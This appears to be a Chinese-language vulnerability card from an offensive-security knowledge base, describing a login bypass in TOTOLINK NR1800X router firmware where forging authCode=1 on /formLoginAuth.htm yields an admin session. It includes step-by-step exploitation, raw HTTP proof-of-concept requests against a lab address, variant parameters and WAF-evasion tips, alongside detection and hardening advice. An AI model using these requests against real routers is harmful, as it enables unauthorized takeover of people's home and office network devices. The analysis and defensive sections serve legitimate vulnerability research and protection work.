---
id: iot-totolink-nr1800x-formloginauth-authcode-login-bypass
title: TOTOLINK NR1800X lighttpd formLoginAuth.htm authCode=1 登录绕过：伪造 authCode 直接创建 SESSION_ID 进后台
type: scenario
domain: iot
path: iot
technique: totolink-nr1800x-formloginauth-authcode-bypass
aliases:
- TOTOLINK NR1800X 登录绕过
- formLoginAuth.htm
- authCode=1
- cstecgi.cgi action=login
- lighttpd Form_Login
- TOTOLINK 未授权后台
tags:
- iot
- router
- totolink
- auth-bypass
- lighttpd
- form-login
- session
- mips
cve: []
severity: high
confidence: high
affected_versions: TOTOLINK NR1800X V9.1.0u.6279_B20210910（原文固件 V9.1.0u.6279）
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V284
  verified_at: '2026-11-08T04:53:07+08:00'
  notes: 已对照原文与全部19张图片逐项核对：固件解包目录V9.1.0u.6279_B20210910、lighttpd/1.4.20、QEMU系统态启动、POST cstecgi.cgi action=login 302到formLoginAuth.htm?authCode=0、Form_Login对authCode/userName/password/goURL/flag的解析与v7分支建会话、伪造authCode=1进入/basic/index.html后台（图19）均与原文一致；原文为单版本固件复现，affected_versions按原文保留V9.1.0u.6279_B20210910；dedup与iot-dlink-getcfg等仅related；本条为IoT设备卡，不受组件版本区间规则影响；未复跑PoC。
---

## 一句话结论

TOTOLINK NR1800X 的 lighttpd `Form_Login` 处理逻辑把 URL 参数 `authCode` 当作“登录是否成功”的信任标记：`POST /cgi-bin/cstecgi.cgi?action=login` 用错误口令会 302 到 `formLoginAuth.htm?authCode=0...`，攻击者把 `authCode` 改成 1 直接请求 `/formLoginAuth.htm?authCode=1&userName=admin&password=aaa&goURL=home.html&action=login`，服务端不校验用户名/口令就创建表单会话并下发 `SESSION_ID`，随后可访问 `/basic/index.html` 等后台页面。

## 原理

- **登录请求与 302**：`POST /cgi-bin/cstecgi.cgi?action=login`（`username=admin&password=55555`）返回 302，`Location: http://<host>/formLoginAuth.htm?authCode=0&userName=&goURL=login.html&action=login`，body 为 `protal page`；`cstecgi.cgi` 的 login 分支读取 `username/password`，与 NVRAM 中 `http_username`/`http_passwd` 比较，然后把结果以 `authCode=%d` 拼进 redirectURL（失败为 0）。
- **lighttpd 的 Form_Login 解析**：`/formLoginAuth.htm` 由 lighttpd 内 `Form_Login` 处理；它用 `getNthValueSafe` 按 `&` 和 `=` 拆分查询串，把 `authCode` 用 `atoi` 存为数值，并读取 `userName`、`password`、`goURL`、`flag`。
- **authCode 被当作登录结果**：`if (v7)`（v7 = atoi(authCode)）成立时进入会话逻辑：先查 `SESSION_ID` Cookie 与 `form_get_idx_by_sessionid`，不存在则创建表单会话（`sprintf(v18, "%d:%s", 2, v14)` 等），返回 `http://<host>/<goURL>?timestamp=<time>`；随后浏览器拿到 `SESSION_ID`。也就是说，服务端没有把 authCode 与真实凭据校验结果绑定，客户端传 1 就代表“已验证”。
- **goURL/flag 的影响**：goURL 为空时按 flag 选择默认页（含 `ie8` → `wan_ie.html`、`flag==1` → `phone/home.html`、否则 `home.html`）；攻击者直接指定 `goURL=home.html` 即可跳到后台首页。
- **为什么能进后台**：后台页面/接口只校验 `SESSION_ID` 会话存在，不校验会话是否由真实口令校验创建；因此伪造 authCode 创建的会话与正常登录会话等价。
- **边界**：需要目标为受影响固件（原文 V9.1.0u.6279_B20210910）、lighttpd 的 formLoginAuth 路由可达；若厂商在 authCode 前增加服务端签名/会话绑定则失效。

## 触发条件

- 目标为 TOTOLINK NR1800X（原文固件 V9.1.0u.6279_B20210910），管理面 `/formLoginAuth.htm` 可达。
- lighttpd 的 `Form_Login` 处理逻辑信任客户端 `authCode` 参数，且未与 cstecgi.cgi 的校验结果做服务端绑定。
- 后台页面仅依赖 `SESSION_ID` Cookie 判断登录态。
- 攻击者能访问管理端口（默认内网/管理 VLAN；仿真环境为 192.168.2.12）。

## 利用步骤

1. 先正常发一次登录请求，观察 302 的 `formLoginAuth.htm?authCode=0...` 格式：
   `POST /cgi-bin/cstecgi.cgi?action=login`，body `username=admin&password=55555`。
2. 直接请求伪造 URL（不跟随原 302，手动构造）：
   `/formLoginAuth.htm?authCode=1&userName=admin&password=aaa&goURL=home.html&action=login`
3. 从响应 `Set-Cookie` 提取 `SESSION_ID`，或让浏览器跟随跳转。
4. 带 `SESSION_ID` 访问 `/basic/index.html`（原文截图显示 TOTOLINK 后台首页、基本设置/高级设置等菜单）。
5. 用该会话调用需要认证的管理接口（无线设置、访客网络、系统状态等）继续操作。

## PoC

```http
POST /cgi-bin/cstecgi.cgi?action=login HTTP/1.1
Host: 192.168.2.12
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=admin&password=55555
```

响应（失败）：

```http
HTTP/1.1 302 Found
Location: http://192.168.2.12/formLoginAuth.htm?authCode=0&userName=&goURL=login.html&action=login
Server: lighttpd/1.4.20
Content-Length: 11

protal page
```

绕过请求：

```http
GET /formLoginAuth.htm?authCode=1&userName=admin&password=aaa&goURL=home.html&action=login HTTP/1.1
Host: 192.168.2.12
```

随后带返回的 `SESSION_ID` 访问 `http://192.168.2.12/basic/index.html`，可见后台首页（原文图 19）。

说明：文章在 QEMU 系统态（Debian mipsel malta + tap/bridge + chroot squashfs-root）复现；固件 V9.1.0u.6279_B20210910，lighttpd/1.4.20，MIPS 小端。

## 变体与关联

- **同类“信任参数建会话”**：[[web-generic-auth-cgi-login-auth-param-session-bypass]]（GET `/www/http?action=login&auth=1` 直接建 `normaluser` 会话，参数名与实现不同）；本卡是 TOTOLINK lighttpd `Form_Login` 的 `authCode` 参数与 `formLoginAuth.htm` 路由。
- **其它路由器登录绕过**：[[iot-iptime-ax2004m-cgi-alias-path-auth-bypass]]（路径别名绕过会话校验）、[[iot-cisco-rv34x-unauth-upload-cgi-mv-login-xss]]（假鉴权上传）等同属 IoT 管理面认证缺陷。
- **环境复现**：系统态 QEMU 方法见 [[code-analysis-reverse-firmware-qemu-system-mipsel-router-httpd]]；本文 lighttpd 需指定 `-f ./lighttpd/lighttpd.conf` 并预建 `/var/run/lighttpd.pid`，user-mode 下页面白板，系统态才正常。
- **变体**：authCode 换成 `auth=1`、`isAdmin=1`、`flag=1` 等信任标记；若参数被 WAF 拦，可尝试大小写/编码/重复参数。

## 检测与防御

- **固件/厂商**：升级修复固件；服务端不要把客户端 `authCode` 当登录结果，必须由服务端校验凭据后签发会话，并将会话与凭据校验结果绑定（签名/一次性 token）。
- **检测**：监控 `formLoginAuth.htm` 请求中 `authCode` 非 0/1 之外异常值、`userName`/`password` 与实际登录不匹配、未经过 `cstecgi.cgi?action=login` 直接访问 formLoginAuth；`SESSION_ID` 创建频率异常。
- **加固**：管理面限制内网/VPN 访问；WAF 阻断 `/formLoginAuth.htm` 带 `authCode=` 且无有效登录跳转来源的请求；会话 Cookie 设置 HttpOnly/Secure/SameSite 并定期轮换。
- **排查**：检查固件版本（V9.1.0u.6279 等）、后台访问日志中直接请求 formLoginAuth 的记录、异常 SESSION_ID 使用。
